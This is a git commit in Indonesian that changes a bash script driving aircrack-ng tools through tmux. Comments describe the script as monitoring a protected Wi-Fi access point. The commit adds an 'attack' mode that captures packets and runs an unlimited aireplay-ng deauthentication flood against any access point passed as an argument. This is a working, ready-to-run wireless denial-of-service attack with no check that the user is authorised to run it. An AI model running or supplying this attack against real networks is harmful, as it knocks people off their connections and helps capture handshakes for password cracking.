1c96045b9ea8ea840b068cefe1d381e5804333e7
tringgiling <iqbalnugraha8989@gmail.com>
2021-07-13 02:57:18 +0700

    Tambah parameter serang, buat aireplay

--- pantau.sh
+++ pantau.sh
@@ -2,18 +2,21 @@
 
 if [[ $1 == "awal" ]]						# buat milih AP yang mau dilindungi di awal2
 then
-	sudo airmon-ng start wlan1 # Mulai Mode Monitor #wlp10s0f0
+	sudo airmon-ng start wlan1 #Mulai Mode Monitor #wlp10s0f0
 	tmux new -d 								# ngebuat session khusus buat nanti ngejalanin airodump-ng
-	sudo tmux send -Rt 0 airodump-ng SPACE -w SPACE hasil_pantauan SPACE --write-interval SPACE 1 SPACE  wlan1mon ENTER #ngejalanin airodump di tmux session 0 #wlp10s0f0mon
-	echo "Tunggu bentar ok?" 
-	sleep 10s
+	sudo tmux send -Rt 0 airodump-ng SPACE -w SPACE hasil_pantauan SPACE --output-format SPACE csv,pcap SPACE --write-interval SPACE 1 SPACE  wlan1mon ENTER  
 
+elif [[ $1 == "serang" ]]
+then
+	tmux new -d
+	sudo tmux send -Rt 0 airodump-ng SPACE -w SPACE serang SPACE --output-format SPACE pcap SPACE  wlan0mon ENTER
+	tmux new -d
+	sudo tmux send -Rt 1 aireplay-ng SPACE --deauth SPACE 0 SPACE -a SPACE $2 SPACE wlan1mon ENTER
 
 else 												# Mode fokus, Airodump cuma mantau AP dilindungi aja
-	sudo rm hasil_pantauan-01.*
+	sudo rm hasil_pantauan-*
 	tmux kill-session -t 0
 	tmux new -d
-	sudo tmux send -Rt 0 airodump-ng SPACE -N SPACE "'$1'" SPACE -w SPACE hasil_pantauan SPACE --write-interval SPACE 1 SPACE wlan1mon  ENTER #ngejalanin airodump di tmux session 0 #wlp10s0f0mon
-	echo Melakukan Scaning Ke "$1" 
-	sleep 7s
+	sudo tmux send -Rt 0 airodump-ng SPACE -N SPACE "'$1'" SPACE -w SPACE hasil_pantauan SPACE --output-format SPACE csv,pcap SPACE --write-interval SPACE 1 SPACE wlan1mon  ENTER #ngejalanin airodump di tmux session 0 #wlp10s0f0mon 
+	sleep 5s
 fi
